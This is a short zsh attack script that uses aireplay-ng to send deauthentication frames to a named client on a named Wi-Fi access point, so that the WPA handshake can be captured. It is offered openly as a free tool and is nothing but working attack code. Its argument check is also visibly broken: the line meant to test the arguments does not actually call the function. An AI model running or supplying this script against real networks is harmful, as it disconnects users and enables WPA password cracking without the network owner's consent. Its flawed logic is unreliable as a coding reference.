#!/bin/zsh
# Script written by zc00l
#   De-authenticate clients to capture WPA handshakes
#   Free License Boys!!

# Static variables
uid=$(id -u)
num_packets=3

function check_root
{
	if [ "${uid}" != "0" ]; then
		echo "[!] Error: Not enough privileges to run this script."
		exit
    fi
}

function check_aircrack
{
	#  check if the tool is on PATH
	app=$(which aireplay-ng);
	if [[ ! -e $app ]]; then
		echo "\033[091mError\033[0m: aireplay-ng is not installed.";
		exit;
	fi
}

function check_args
{
    i=0
    if [ "$1" != "" ]; then
        ((i++));
    fi
    if [ "$2" != "" ]; then
        ((i++));
    fi
    if [ "$i" == "2" ]; then
        return 0
    fi
    return 1

}




check_root;
check_aircrack;
status=check_args ${1} ${2}
if [ "$status" == "0" ]; then
    echo "[+] Sending command to deauth client ${2} from the AP ${1} ..."
    aireplay-ng --deauth ${num_packets} wlan0mon -a ${1} -c ${2}
else
    echo "[!] Not enough arguments."
fi
